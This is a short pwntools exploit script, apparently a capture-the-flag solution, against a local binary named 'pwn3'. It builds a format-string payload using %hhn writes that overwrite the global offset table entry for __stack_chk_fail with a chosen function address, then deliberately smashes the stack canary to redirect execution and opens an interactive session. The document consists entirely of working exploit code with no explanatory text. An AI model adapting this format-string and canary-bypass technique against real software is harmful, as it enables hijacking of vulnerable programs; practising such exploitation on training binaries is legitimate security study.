#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
	p = process('./pwn3')
	elf = ELF('./pwn3')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	pass

stack_chk_fail_got = elf.got['__stack_chk_fail']
func = 0x401256

'\x56\x12\x40\x00'

#gdb.attach(p, 'b *0x4015C7\nc')

p.recvuntil('What is the perfect format?')
payload = b'%18c%10$hhn' + b'%68c%9$hhn' + b'\x00' * 3 + p64(stack_chk_fail_got) + p64(stack_chk_fail_got + 1)
payload += b'A' * 0x100 # overflow canary
p.sendline(payload)

p.interactive()

